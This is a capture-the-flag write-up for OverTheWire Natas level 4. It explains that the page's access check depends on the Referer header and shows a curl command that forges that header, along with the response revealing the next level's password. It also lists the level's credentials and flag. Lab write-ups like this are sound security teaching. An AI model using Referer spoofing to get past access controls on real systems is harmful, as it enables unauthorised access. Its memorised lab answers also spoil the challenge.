# Natas4

*	user: `natas4`
*	pass: `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`
*	url: `http://natas4.natas.labs.overthewire.org`
*	flag: `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

## Procedure

1.	By getting the page's source code, we can see that there's nothing
	interesting. By clicking on `Refresh page`, page content changes from

		Access disallowed. You are visiting from "" while [...]

	to

		Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while [...]

	then if newly click on `Refresh page` it changes in

		Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while [...]

	Seems that it's related to `Referer` HTTP header. Indeed, by repeating the
	procedure with a sniffer, we can see that `Referer` header is set.

2.	The page suggests us that *authorized users should come only from [...]*.
	Let's try to set the `Referer` header to desired value
	(`http://natas5.natas.labs.overthewire.org/`)

		$ curl -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org
		<html>
		<head>
		<!-- This stuff in the header has nothing to do with the level -->
		<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
		<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
		<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
		<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
		<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
		<body>
		<h1>natas4</h1>
		<div id="content">

		Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
		<br/>
		<div id="viewsource"><a href="index.php">Refresh page</a></div>
		</div>
		</body>
		</html>
